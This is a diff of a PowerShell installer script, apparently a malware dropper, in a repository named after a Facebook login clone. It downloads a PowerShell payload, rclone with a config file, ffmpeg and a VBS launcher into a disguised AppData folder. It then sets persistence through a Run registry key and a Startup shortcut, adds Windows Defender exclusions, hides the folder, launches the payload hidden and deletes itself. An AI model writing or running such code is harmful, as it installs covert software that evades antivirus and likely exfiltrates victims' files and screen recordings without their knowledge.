@@ -1,41 +1,47 @@
-# setup.ps1 - Win+R installer luna
+# setup.ps1
+
 $dest = "$env:APPDATA\Microsoft\Windows\luna"
+$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
+$files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.vbs")
+
+# 
 New-Item -ItemType Directory -Path $dest -Force | Out-Null
 
-$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
-$files = @("luna.ps1", "rclone.exe", "rclone.conf", "luna_launcher.bat")
-
+# 
 foreach ($file in $files) {
-    $url = "$repo/$file"
-    $out = Join-Path $dest $file
-    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
-    Write-Host "Downloaded $file"
-} catch {
-    Write-Warning "Failed to download $file from $url"
+    try {
+        Invoke-WebRequest -Uri "$repo/$file" -OutFile "$dest\$file" -UseBasicParsing
+        Write-Host "Downloaded $file"
+    } catch {
+        Write-Warning "Failed to download $file"
+    }
 }
 
-#  Defender 
-Add-MpPreference -ExclusionPath $dest -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess "$dest\luna_launcher.bat" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess "$dest\luna.ps1" -ErrorAction SilentlyContinue
+#
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$dest\luna_launcher.vbs"
 
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$dest\luna_launcher.bat"
-
-# Start Menu
+#
 $WshShell = New-Object -ComObject WScript.Shell
-$lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\luna.lnk"
-$shortcut = $WshShell.CreateShortcut($lnk)
-$shortcut.TargetPath = "$dest\luna_launcher.bat"
+$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\luna.lnk"
+$shortcut = $WshShell.CreateShortcut($lnkPath)
+$shortcut.TargetPath = "$dest\luna_launcher.vbs"
 $shortcut.WorkingDirectory = $dest
 $shortcut.Save()
 
-(Get-Item $dest).Attributes += 'Hidden'
+#
+Add-MpPreference -ExclusionPath $dest -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "$dest\luna.ps1" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "$dest\luna_launcher.vbs" -ErrorAction SilentlyContinue
 
-# Start
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/ffmpeg.exe" -OutFile "$dest\ffmpeg.exe" -UseBasicParsing
-Start-Process -WindowStyle Hidden -FilePath "$dest\luna_launcher.bat"
+#
+try {
+    (Get-Item $dest).Attributes += 'Hidden'
+} catch {}
 
-# Delete
+#
+Start-Process -WindowStyle Hidden -FilePath "$dest\luna_launcher.vbs"
+
+#
 $me = $MyInvocation.MyCommand.Path
 Start-Sleep -Seconds 2
-Remove-Item $me -Force
+Remove-Item $me -Force -ErrorAction SilentlyContinue
